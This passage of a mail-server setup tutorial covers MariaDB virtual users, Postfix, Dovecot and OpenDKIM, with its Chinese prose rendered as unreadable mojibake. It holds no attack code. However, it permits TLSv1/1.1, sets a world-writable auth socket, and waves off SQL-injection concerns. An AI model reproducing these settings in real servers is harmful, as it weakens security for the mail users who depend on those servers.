å¦‚æœè¦åˆ›å»ºè½¬å‘ï¼Œå‚ç…§ä¸‹é¢çš„å†™æ³•<br># <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> virtual_aliases <span class="hljs-keyword">VALUE</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, &quot;rat3bant@test.com&quot;, &quot;arttnba3@test.com&quot;);<br></code></pre></td></tr></table></figure><p>æœ€ååˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å¹¶ç»™äºˆè¿™äº›è¡¨çš„æƒé™ï¼Œåç»­æˆ‘ä»¬ä½¿ç”¨è¯¥ç”¨æˆ·è®¿é—®æ•°æ®åº“è€Œéç›´æ¥ä½¿ç”¨ rootï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;mailuser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;ä½ çš„å¯†ç &#x27;</span>;<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> mail_db.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;mailuser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br>FLUSH PRIVILEGES;<br>EXIT;<br></code></pre></td></tr></table></figure><h2 id="Postfix-Dovecot-å®‰è£…"><a href="#Postfix-Dovecot-å®‰è£…" class="headerlink" title="Postfix + Dovecot å®‰è£…"></a>Postfix + Dovecot å®‰è£…</h2><p>é¦–å…ˆå®‰è£… Postfixï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y postfix postfix-mysql libmariadb-dev libmariadb3</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªé€‰æ‹©é…ç½®çš„é€‰é¡¹ï¼Œæˆ‘ä»¬å…ˆé€‰ <code>Internet Site</code> ï¼Œä¹Ÿå°±æ˜¯ç”±è¯¥æœåŠ¡å™¨é€šè¿‡ SMTP åè®®ç›´æ¥æ”¶å‘é‚®ä»¶ï¼š</p><p><img src="https://s2.loli.net/2025/03/25/irWVePTY45Dz8ap.png"></p><p>ç„¶åé…ç½® system mail nameï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯é‚®ä»¶æ‰€ä½¿ç”¨çš„åŸŸåï¼Œä»¥ <code>arttnba3@example.com</code> ä¸ºä¾‹è¿™é‡Œåº”å½“å¡« <code>example.com</code>ï¼š</p><p><img src="https://s2.loli.net/2025/03/25/6XbNazToMyS4kpc.png"></p><p>æ¥ä¸‹æ¥å®‰è£… Dovecotï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y dovecot-core dovecot-pop3d dovecot-imapd dovecot-lmtpd dovecot-mysql</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-Postfix"><a href="#é…ç½®-Postfix" class="headerlink" title="é…ç½® Postfix"></a>é…ç½® Postfix</h2><h3 id="é…ç½®-SSL-è¯ä¹¦"><a href="#é…ç½®-SSL-è¯ä¹¦" class="headerlink" title="é…ç½® SSL è¯ä¹¦"></a>é…ç½® SSL è¯ä¹¦</h3><p>ç¬”è€…ç›´æ¥ç”¨çš„ Cloudflare æä¾›çš„è¯ä¹¦ï¼Œå°†å…¶ä¿å­˜åˆ°æœåŠ¡å™¨æœ¬åœ°ä¸­ï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>/etc/ssl/certs/è¯ä¹¦.pem</code></li><li><code>/etc/ssl/private/è¯ä¹¦.key</code></li></ul><p>ç„¶åä¿®æ”¹ Postfix çš„ä¸»é…ç½®æ–‡ä»¶ <code>/etc/postfix/main.cf</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cf">smtpd_tls_cert_file=/etc/ssl/certs/ä½ çš„è¯ä¹¦.pem<br>smtpd_tls_key_file=/etc/ssl/private/ä½ çš„å¯†é’¥.key<br>smtpd_use_tls=yes<br>smtpd_tls_security_level=encrypt<br>smtpd_tls_mandatory_protocols = TLSv1, TLSv1.1, TLSv1.2, TLSv1.3<br>smtpd_tls_mandatory_ciphers = high<br><br>smtp_tls_security_level=encrypt<br></code></pre></td></tr></table></figure><h3 id="é…ç½®ä½¿ç”¨-Dovecot-è¿›è¡Œèº«ä»½è®¤è¯"><a href="#é…ç½®ä½¿ç”¨-Dovecot-è¿›è¡Œèº«ä»½è®¤è¯" class="headerlink" title="é…ç½®ä½¿ç”¨ Dovecot è¿›è¡Œèº«ä»½è®¤è¯"></a>é…ç½®ä½¿ç”¨ Dovecot è¿›è¡Œèº«ä»½è®¤è¯</h3><p>ä¿®æ”¹ Postfix çš„ä¸»é…ç½®æ–‡ä»¶ <code>/etc/postfix/main.cf</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cf">smtpd_sasl_type = dovecot<br>smtpd_sasl_path = private/auth<br>smtpd_sasl_auth_enable = yes<br>smtpd_tls_auth_only = yes<br>smtpd_recipient_restrictions = permit_sasl_authenticated permit_mynetworks reject_unauth_destination<br>smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination<br></code></pre></td></tr></table></figure><h3 id="åŸŸåç­‰å¸¸è§„é…ç½®"><a href="#åŸŸåç­‰å¸¸è§„é…ç½®" class="headerlink" title="åŸŸåç­‰å¸¸è§„é…ç½®"></a>åŸŸåç­‰å¸¸è§„é…ç½®</h3><p>ä¿®æ”¹ Postfix çš„ä¸»é…ç½®æ–‡ä»¶ <code>/etc/postfix/main.cf</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cf">myhostname = ä½ çš„mailåŸŸå<br>myorigin = $myhostname<br>mydomain = $myhostname<br>mydestination = localhost<br>smtp_helo_name = $myhostname<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-MariaDB-ä¸-Dovecot-ç›¸å…³"><a href="#é…ç½®-MariaDB-ä¸-Dovecot-ç›¸å…³" class="headerlink" title="é…ç½® MariaDB ä¸ Dovecot ç›¸å…³"></a>é…ç½® MariaDB ä¸ Dovecot ç›¸å…³</h3><blockquote><p>æš‚æ—¶å…ˆä¸è€ƒè™‘ SQL æ³¨å…¥â€¦å› ä¸ºğŸ‘´å¤ªæ‡’äº†ï¼Œåæ­£é—®äº†é—® ChatGPT å¤§æ¦‚æ˜¯æ²¡é—®é¢˜çš„ï¼šï¼ˆ</p></blockquote><p>ä¿®æ”¹ Postfix çš„ä¸»é…ç½®æ–‡ä»¶ <code>/etc/postfix/main.cf</code> ï¼Œæ·»åŠ è¿™äº›é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cf">virtual_mailbox_domains = mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf<br>virtual_mailbox_maps = mysql:/etc/postfix/mysql-virtual-mailbox-maps.cf<br>virtual_alias_maps = mysql:/etc/postfix/mysql-virtual-alias-maps.cf<br>virtual_transport = lmtp:unix:private/dovecot-lmtp<br></code></pre></td></tr></table></figure><p>åœ¨ <code>/etc/postfix/mysql-virtual-mailbox-domains.cf</code> ä¸­æŒ‰ç…§å‰é¢çš„é…ç½®å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">user</span> = mailuser <br><span class="hljs-attr">password</span> = å‰é¢è®¾ç½®çš„å¯†ç <br><span class="hljs-attr">hosts</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span> <br><span class="hljs-attr">dbname</span> = mail_db   <br><span class="hljs-attr">query</span> = SELECT <span class="hljs-number">1</span> FROM virtual_domains WHERE name=<span class="hljs-string">&#x27;%s&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>/etc/postfix/mysql-virtual-mailbox-maps.cf</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">user</span> = mailuser <br><span class="hljs-attr">password</span> = å‰é¢è®¾ç½®çš„å¯†ç <br><span class="hljs-attr">hosts</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span> <br><span class="hljs-attr">dbname</span> = mail_db   <br><span class="hljs-attr">query</span> = SELECT <span class="hljs-number">1</span> FROM virtual_users WHERE email=<span class="hljs-string">&#x27;%s&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>/etc/postfix/mysql-virtual-alias-maps.cf</code> ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">user</span> = mailuser <br><span class="hljs-attr">password</span> = å‰é¢è®¾ç½®çš„å¯†ç <br><span class="hljs-attr">hosts</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span> <br><span class="hljs-attr">dbname</span> = mail_db   <br><span class="hljs-attr">query</span> = SELECT destination FROM virtual_aliases WHERE source=<span class="hljs-string">&#x27;%s&#x27;</span><br></code></pre></td></tr></table></figure><p>æœ€åé‡å¯ Postfixï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart postfix</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œæµ‹è¯•æ—¶ï¼Œç»“æœéƒ½åº”å½“è¿”å› <code>1</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo postmap -q å‰é¢æ·»åŠ çš„åŸŸå mysql:/etc/postfix/mysql-virtual-mailbox-domains.cf</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo postmap -q å‰é¢æ·»åŠ çš„é‚®ç®± mysql:/etc/postfix/mysql-virtual-mailbox-maps.cf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¦‚æœä½ æ·»åŠ äº†é‚®ç®±åˆ«åï¼Œè¿è¡Œä¸‹é¢çš„æµ‹è¯•å‘½ä»¤ï¼š</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo postmap -q å‰é¢æ·»åŠ çš„é‚®ç®± mysql:/etc/postfix/mysql-virtual-alias-maps.cf</span><br></code></pre></td></tr></table></figure><h3 id="å¼€å¯é‚®ä»¶æäº¤"><a href="#å¼€å¯é‚®ä»¶æäº¤" class="headerlink" title="å¼€å¯é‚®ä»¶æäº¤"></a>å¼€å¯é‚®ä»¶æäº¤</h3><blockquote><p>ç®€è€Œè¨€ä¹‹ç”¨æ¥ç»™å®¢æˆ·ç«¯å‘æœåŠ¡å™¨æäº¤è¯·æ±‚ï¼Œä¸€ä¸ªæ˜¯å¸¸è§„çš„ 587 ç«¯å£çš„æäº¤ï¼Œå¦ä¸€ä¸ªæ˜¯å¦‚ outlook ç­‰é‚®ä»¶å®¢æˆ·ç«¯é€šè¿‡ 465 ç«¯å£çš„ SMTPS æäº¤é‚®ä»¶</p></blockquote><p>ç¼–è¾‘ <code>/etc/postfix/master.cf</code> æ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">submission inet n       -       y       -       -       smtpd<br>  -o <span class="hljs-attribute">syslog_name</span>=postfix/submission<br>  -o <span class="hljs-attribute">smtpd_tls_security_level</span>=encrypt<br>  -o <span class="hljs-attribute">smtpd_sasl_auth_enable</span>=<span class="hljs-literal">yes</span><br>  -o <span class="hljs-attribute">smtpd_tls_auth_only</span>=<span class="hljs-literal">yes</span><br>smtps      inet n       -       y       -       -       smtpd<br>  -o <span class="hljs-attribute">syslog_name</span>=postfix/smtps<br>  -o <span class="hljs-attribute">smtpd_tls_wrappermode</span>=<span class="hljs-literal">yes</span><br>  -o <span class="hljs-attribute">smtpd_sasl_auth_enable</span>=<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-Dovecot"><a href="#é…ç½®-Dovecot" class="headerlink" title="é…ç½® Dovecot"></a>é…ç½® Dovecot</h2><h3 id="é…ç½®åè®®"><a href="#é…ç½®åè®®" class="headerlink" title="é…ç½®åè®®"></a>é…ç½®åè®®</h3><p>åœ¨ <code>/etc/dovecot/dovecot.conf</code> ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">protocols</span> <span class="hljs-operator">=</span> imap lmtp pop3<br></code></pre></td></tr></table></figure><h3 id="åˆ›å»ºè™šæ‹Ÿç”¨æˆ·"><a href="#åˆ›å»ºè™šæ‹Ÿç”¨æˆ·" class="headerlink" title="åˆ›å»ºè™šæ‹Ÿç”¨æˆ·"></a>åˆ›å»ºè™šæ‹Ÿç”¨æˆ·</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç”¨æˆ·ä½œä¸º Dovecot çš„åç«¯ï¼Œè¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>vmail</code> ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd -g 5000 vmail</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo useradd --home-dir /var/mail/ --shell /usr/sbin/nologin -g vmail -u 5000 vmail</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> -R vmail:vmail /var/mail</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>/etc/dovecot/conf.d/10-mail.conf</code> ï¼Œç¡®ä¿å¦‚ä¸‹ä¸¤æ¡é…ç½®ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">mail_location</span> = maildir:/var/mail/vhosts/%d/%n<br><span class="hljs-attr">mail_privileged_group</span> = mail<br></code></pre></td></tr></table></figure><h3 id="é…ç½®è®¤è¯æ–¹å¼"><a href="#é…ç½®è®¤è¯æ–¹å¼" class="headerlink" title="é…ç½®è®¤è¯æ–¹å¼"></a>é…ç½®è®¤è¯æ–¹å¼</h3><p>ä¿®æ”¹ <code>/etc/dovecot/conf.d/10-auth.conf</code> ï¼Œé…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auth_mechanisms</span> = plain login<br></code></pre></td></tr></table></figure><p>æ¥åˆ°æ–‡ä»¶æœ«å°¾ï¼Œæ³¨é‡Šæ‰å…¶ä»– auth æ–¹å¼ï¼Œå¼€å¯ SQLï¼š</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!include auth-system.conf.ext</span><br>!include auth-sql.conf.ext<br><span class="hljs-meta">#!include auth-ldap.conf.ext</span><br><span class="hljs-meta">#!include auth-passwdfile.conf.ext</span><br><span class="hljs-meta">#!include auth-checkpassword.conf.ext</span><br><span class="hljs-meta">#!include auth-static.conf.ext</span><br></code></pre></td></tr></table></figure><p>ä¸å¼€å¯æ˜æ–‡å¯†ç ç™»å½•ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">disable_plaintext_auth</span> = <span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/dovecot/conf.d/auth-sql.conf.ext</code> æ–‡ä»¶ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ext">passdb &#123;<br>  driver = sql<br>  args = /etc/dovecot/dovecot-sql.conf.ext<br>&#125;<br><br>userdb &#123;<br>  driver = sql<br>  args = /etc/dovecot/dovecot-sql.conf.ext<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="é…ç½®-SQL-è®¤è¯è¿‡ç¨‹"><a href="#é…ç½®-SQL-è®¤è¯è¿‡ç¨‹" class="headerlink" title="é…ç½® SQL è®¤è¯è¿‡ç¨‹"></a>é…ç½® SQL è®¤è¯è¿‡ç¨‹</h3><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/dovecot/dovecot-sql.conf.ext</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">driver = mysql<br><span class="hljs-keyword">connect</span> = host=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> port=<span class="hljs-number">3306</span> dbname=mail_db <span class="hljs-keyword">user</span>=mailuser <span class="hljs-keyword">password</span>=å‰é¢è®¾ç½®çš„å¯†ç <br>default_pass_scheme = SHA256-CRYPT<br>user_query = <span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">AS</span> username, <span class="hljs-string">&#x27;/var/mail/vhosts/%d/%n&#x27;</span> <span class="hljs-keyword">AS</span> home, <span class="hljs-number">5000</span> <span class="hljs-keyword">AS</span> uid, <span class="hljs-number">5000</span> <span class="hljs-keyword">AS</span> gid <span class="hljs-keyword">FROM</span> virtual_users <span class="hljs-keyword">WHERE</span> email = <span class="hljs-string">&#x27;%n@%d&#x27;</span>;<br>password_query = <span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">as</span> <span class="hljs-keyword">user</span>, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> virtual_users <span class="hljs-keyword">WHERE</span> email=<span class="hljs-string">&#x27;%u&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-lmtpã€authã€postfix-ç›¸å…³"><a href="#é…ç½®-lmtpã€authã€postfix-ç›¸å…³" class="headerlink" title="é…ç½® lmtpã€authã€postfix ç›¸å…³"></a>é…ç½® lmtpã€authã€postfix ç›¸å…³</h3><p>ä¿®æ”¹ <code>/etc/dovecot/conf.d/10-master.conf</code> ï¼Œç¡®ä¿å¦‚å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">service lmtp &#123;<br>  unix_listener /var/spool/postfix/private/dovecot-lmtp &#123;<br>    mode = <span class="hljs-number">0600</span><br>    <span class="hljs-keyword">user</span> <span class="hljs-title">= postfix</span><br>    <span class="hljs-keyword">group</span> <span class="hljs-title">= postfix</span><br>  &#125;<br>&#125;<br><br>service auth &#123;<br>  unix_listener auth-userdb &#123;<br>    mode = <span class="hljs-number">0600</span><br>    <span class="hljs-keyword">user</span> <span class="hljs-title">= vmail</span><br>  &#125;<br><br>  unix_listener /var/spool/postfix/private/auth &#123;<br>    mode = <span class="hljs-number">0666</span><br>    <span class="hljs-keyword">user</span> <span class="hljs-title">= postfix</span><br>    <span class="hljs-keyword">group</span> <span class="hljs-title">= postfix</span><br>  &#125;<br><br>  <span class="hljs-keyword">user</span> <span class="hljs-title">= dovecot</span><br><br>&#125;<br><br>service auth-worker &#123;<br>  <span class="hljs-keyword">user</span> <span class="hljs-title">= vmail</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-SSL-è®¤è¯"><a href="#é…ç½®-SSL-è®¤è¯" class="headerlink" title="é…ç½® SSL è®¤è¯"></a>é…ç½® SSL è®¤è¯</h3><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/dovecot/conf.d/10-ssl.conf</code> æ–‡ä»¶ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ssl</span> = required<br><span class="hljs-attr">ssl_cert</span> = &lt;è¯ä¹¦ä½ç½®<br><span class="hljs-attr">ssl_key</span> = &lt;å¯†é’¥ä½ç½®<br></code></pre></td></tr></table></figure><h3 id="é…ç½®æ–‡ä»¶å¤¹æƒé™"><a href="#é…ç½®æ–‡ä»¶å¤¹æƒé™" class="headerlink" title="é…ç½®æ–‡ä»¶å¤¹æƒé™"></a>é…ç½®æ–‡ä»¶å¤¹æƒé™</h3><p>ä¿®æ”¹ <code>/etc/dovecot</code> çš„æƒé™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> -R vmail:dovecot /etc/dovecot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> -R o-rwx /etc/dovecot</span><br></code></pre></td></tr></table></figure><p>æœ€åé‡å¯ postfix ä¸ dovecotï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart postfix</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart dovecot</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®-OpenDKIM"><a href="#é…ç½®-OpenDKIM" class="headerlink" title="é…ç½® OpenDKIM"></a>é…ç½® OpenDKIM</h2><p>é¦–å…ˆå®‰è£… OpenDKIMï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install opendkim opendkim-tools</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/opendkim.conf</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><blockquote><p>åŸæ–‡ä»¶ä¸­å¯èƒ½ä¼šæœ‰ä¸€æ¡ <code>Socket</code> å¼€å¤´çš„é»˜è®¤é…ç½®ï¼Œéœ€è¦æ³¨é‡Šæ‰</p></blockquote><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Domain                  ä½ çš„åŸŸå<br>Selector                dkim<br>KeyFile         /etc/dkimkeys/dkim.<span class="hljs-keyword">private</span><br>SOCKET                  inet:<span class="hljs-symbol">8891@</span>localhost<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/default/opendkim</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">SOCKET</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;inet:8891@localhost&quot;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç”Ÿæˆ dkim å¯†é’¥å¯¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo opendkim-genkey -t -s dkim -d ä½ çš„åŸŸå</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mv</span> dkim.private /etc/dkimkeys/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> opendkim:opendkim /etc/dkimkeys/dkim.private</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¿®æ”¹ <code>/etc/postfix/main.cf</code> ï¼Œç¡®ä¿å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">smtpd_milters</span> = inet:localhost:<span class="hljs-number">8891</span><br><span class="hljs-attr">non_smtpd_milters</span> = inet:localhost:<span class="hljs-number">8891</span><br><span class="hljs-attr">milter_protocol</span> = <span class="hljs-number">2</span><br><span class="hljs-attr">milter_default_action</span> = accept<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥é‡å¯ opendkim ä¸ postfixï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart opendkim</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart postfix</span><br></code></pre></td></tr></table></figure><p>æœ€åæ·»åŠ ä¸€æ¡æ ¼å¼ä¸º <code>&quot;v=DKIM1;k=rsa;t=y;p=ä¸€ä¸ªå­—ç¬¦ä¸²&quot;</code> çš„ DNS è®°å½•ï¼Œç±»å‹ä¸º <code>TXT</code>ï¼Œ è®°å½•åä¸º <code>dkim._domainkey</code> ï¼Œp çš„å†…å®¹å‚ç…§å‰é¢ <code>opendkim-genkey</code> å‘½ä»¤åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆçš„ <code>dkim.txt</code> ï¼š</p><p><img src="https://s2.loli.net/2025/03/27/ovekRLA5QtxzTuB.png"></p><h1 id="0x02-æµ‹è¯•ä¸ç™»å½•é‚®ä»¶ç³»ç»Ÿ"><a href="#0x02-æµ‹è¯•ä¸ç™»å½•é‚®ä»¶ç³»ç»Ÿ" class="headerlink" title="0x02. 